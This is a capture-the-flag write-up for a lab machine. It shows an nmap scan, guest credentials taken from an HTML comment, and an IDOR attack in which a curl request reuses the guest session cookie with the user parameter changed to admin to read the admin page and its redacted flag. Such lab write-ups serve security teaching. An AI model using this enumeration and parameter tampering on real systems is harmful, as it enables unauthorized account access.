# IP
10.10.100.159

# Enumeration

## Nmap
Found two ports running on the machine.
```console
❯ nmap -sC -sV --min-rate=700 10.10.100.159 | tee nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-12 10:57 IST
Nmap scan report for 10.10.100.159
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 16:95:5e:6c:b5:20:ea:7f:48:05:66:7f:e2:87:dd:2d (RSA)
|   256 32:c0:4b:50:42:07:42:44:75:cb:73:0a:fe:45:af:d0 (ECDSA)
|_  256 17:6a:e9:69:e7:70:c7:7d:91:fc:7f:33:6d:7a:75:91 (ED25519)
80/tcp open  http    Apache httpd 2.4.53 ((Debian))
|_http-server-header: Apache/2.4.53 (Debian)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
```

## Web
- On going two website it prompts with a login screen.
- It says that if we don't have an account we can use a guest account.

```html
<p>Don't have an account? Use the guest account! (<code>Ctrl+U</code>)</p>
<!-- use guest:guest credentials until registration is fixed -->
```

# Exploitaion
## Insecure Direct Object Reference (IDOR)
- When logged in with guest credential it redirects us to `http://10.10.100.159/profile.php?user=guest`
- Change user parameter to admin and voila! got the flag

```console
❯ curl  http://10.10.100.159/profile.php\?user\=admin   --cookie PHPSESSID=72a7718d9612f8f6eabea832164def20

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Welcome</title>
    <!-- admin account could be vulnerable, need to update -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; text-align: center; }
    </style>
</head>
<body>
    <h1 class="my-5">Hi, <b>admin</b>. Welcome to your site. The flag is: flag{**REDACTED**}</h1>
    <p>
        <a href="logout.php" class="btn btn-danger ml-3">Sign Out of Your Account</a>
    </p>
</body>
</html>
```
- The bug seems to be related to PHPSESSID cookie, the PHP in backend authenticates PHPSESSID, but does not authenticate it with the username 
